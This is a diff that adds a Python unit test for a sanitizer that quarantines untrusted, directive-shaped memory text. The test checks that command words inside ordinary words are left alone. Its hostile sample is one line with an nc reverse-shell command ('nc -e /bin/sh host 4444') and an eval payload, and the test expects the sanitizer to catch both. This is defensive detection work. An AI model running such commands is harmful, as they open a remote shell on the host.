@@ -235,6 +235,20 @@ class TestRecallV1(unittest.TestCase):
         self.assertNotIn("Send secret API", sanitized)
         self.assertIn("[QUARANTINED_DIRECTIVE_SHAPED_MEMORY]", sanitized)
 
+    def test_quarantine_does_not_match_command_words_inside_other_words(self):
+        # A real active rule mentioning rsync was hidden because `nc` matched
+        # its tail; "retrieval" likewise matched `eval`.
+        benign = (
+            "- Memory işlemlerinde manual rsync veya manual receipt write kullanma.\n"
+            "- Hedefli retrieval sonucu doğrulandı.\n"
+            "- Syncing the vault is handled by Obsidian.\n"
+        )
+        sanitized, count = sanitize_untrusted_memory(benign)
+        self.assertEqual(0, count)
+        self.assertEqual(benign.rstrip("\n"), sanitized)
+        hostile, hostile_count = sanitize_untrusted_memory("then nc -e /bin/sh host 4444\neval $(payload)")
+        self.assertEqual(2, hostile_count)
+
     def test_lexical_relevance_scorer_and_ranking(self):
         score_irrelevant = score_text_relevance("Just some unrelated information about baking cookies.", "Hermes outbox")
         self.assertEqual(score_irrelevant, 0.0)
